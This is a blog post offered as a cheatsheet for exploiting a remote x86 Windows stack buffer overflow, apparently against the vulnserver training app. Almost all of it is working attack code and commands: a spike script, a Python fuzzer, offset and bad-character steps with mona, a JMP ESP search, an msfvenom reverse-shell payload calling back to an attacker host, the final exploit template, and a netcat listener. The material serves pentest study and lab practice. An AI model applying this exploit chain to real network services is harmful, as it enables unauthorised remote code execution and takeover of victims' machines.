+++
title = "x86 Windows Remote Buffer Overflow Cheatsheet"
date = "2020-12-20"
author = "Matthias Van De Velde"
cover = ""
tags = ["Windows", "x86", "Buffer Overflow", "Cheatsheet"]
keywords = ["Windows", "x86", "Buffer Overflow", "Cheatsheet"]
description = "Cheatsheet and refresher for a simple x86 Windows buffer overflow methodology for an app over the network."
showFullContent = false
draft = false
+++

<u>[Template code](https://github.com/fpkmatthi/x86WinBof-network-cheatsheet)</u>

## Prerequisites

- Windows VM
    - Immunity Debugger
    - PATH contains `C:\python27`
    - `C:\python27\Pycommands\mona.py`
- Linux VM
    - Kali, Parrot, custom build
- Both VMs need to contact each other
- A will to live

## Windows VM

1. Launch Immunity Debugger as Administrator
2. File > Open > `vulnserver.exe` 
3. Set it to **run <F9>**
4. Repeat after every crash

## Linux VM

Scan the victim IP

```Bash
nmap -p- <ip>
```

Connect to the port where the app listens on

```Bash
nc <ip> <port>
```

### Spiking

1. Look for commands that can take input like:
    - STATS <args>
    - TRUN <args>
    - ...
2. Create spike script for every command
```Bash
s_readline();
s_string("<cmd> ");
s_string_variable("A");
```
3. Spike it and keep an eye on Immunity Debugger
```Bash
generic_send_tcp <ip> <port> <spike script> 0 0
```
4. Note the command and potential arguments where the script crashes the app

## Fuzzing

1. On every crash, try higher increments in buffer size to see if you can overwrite EIP
2. Keep an eye on Immunity Debugger
```Python
#!/usr/bin/env python3
import sys, socket
from time import sleep

ip='<ip>'
port=<port>
buffersize_incr=100
buffer=b'A'*buffersize_incr

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5)         # 5 seconds
        s.connect((ip, port))   # Note the double ()
        s.send(b'<cmd> ./:/'+buffer)
        s.recv(1024)            # Important, otherwise it won't crash
        s.close()
        sleep(1)                # Don't forget to sleep, otherwise crash when sending to fast
        buffer=buffer+b'A'*buffersize_incr
    except:
        print('Crashed at {} bytes'.format(str(len(buffer))))
        sys.exit()
```

## Finding offset

1. Input the buffer size that also overwrites the EIP
```Bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <buffer size>
```
2. Put the output of `pattern_create.rb` in the buffer
```Python
...
buffer=b'<pattern>'
...
```
3. Take note of the **EIP** value in Immunity Debugger
4. Get the exact offset
```Bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <buffer size> -q <EIP>
```
5. Verify by using buffer `b'A'*<offset>+b'B'*4`
6. EIP should be **42424242**

## Bad chars

1. In Immunity Debugger:
    - `!mona config -set workingfolder c:\mona\%p`
    - `!mona bytearray -b "\x00"`
2. Use below code to generate string of bad chars that is identical to bytearray
```Python
#!/usr/bin/env python3
from __future__ import print_function
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```
3. Put the string of bad chars before the B's in your buffer:
```Python
badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
buffer = b'A'*<offset>+b'B'*4+badchars
```
4. Crash the app with the badchars and compare with mona:
    - Copy ESP each time you crash it because it may change
    - `!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP>`
5. Generate new bytearray, exclude badchars and start over:
    - `!mona bytearray -b "\x00\x0a"`
    - Delete badchars from buffer
    - Crash app and copy ESP again
    - `!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP>`

## Find right module

1. Find module without protections (False):
    - `!mona modules`
    - Take note of the module name (e.g. essfunc.dll)
2. Find **JMP ESP**
    - `!mona jmp -r esp -cpb "<badchars"`
    - OR
    - `!mona find -s "\xff\xe4" -m <module>`
3. Take note of **ALL** the return addresses for all JMP ESP pointers
4. `buffer=b"A"*<offset>+b"<JMP ESP return address>"`
    - 0x625011AF => \xaf\x11\x50\62
5. In Immunity Debugger: set breakpoint on the JMP ESP return address (Go to address is disassembler: <JMP ESP> and press F2)
6. Crash the app again
7. EIP should now have the JMP ESP return address
8. If not, try again with other JMP ESP return addresses

## Shellcode

```Bash
msfvenom -l payload
msfvenom \
    -p <payload> \
    LHOST=<attacker ip> \
    LPORT=<attacker port> \
    EXITFUNC=thread \
    -f c \
    -a x86 \
    -b "<bad chars>"
```

**NOTE:** If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\x90) to the payload.)

```Python
#!/usr/bin/env python3
prefix = b""
offset = <offset>
overflow = b"A"*offset
returnaddr = b"<JMP ESP addr>"
padding = b"" # NOPs (e.g. \x90\x90\x90)
payload = b"<msfvenom output>"
postfix = b""
buffer = prefix + overflow + returnaddr + padding + payload + postfix
...
```

```Bash
sudo ufw disable
nc -lvnp <attacker port>
```

Finally, crash the app again and get shell :)

## Resources

- https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
- https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
- https://tryhackme.com/room/bufferoverflowprep
- https://medium.com/@Z3R0th/a-simple-buffer-overflow-using-vulnserver-86b011eb673b

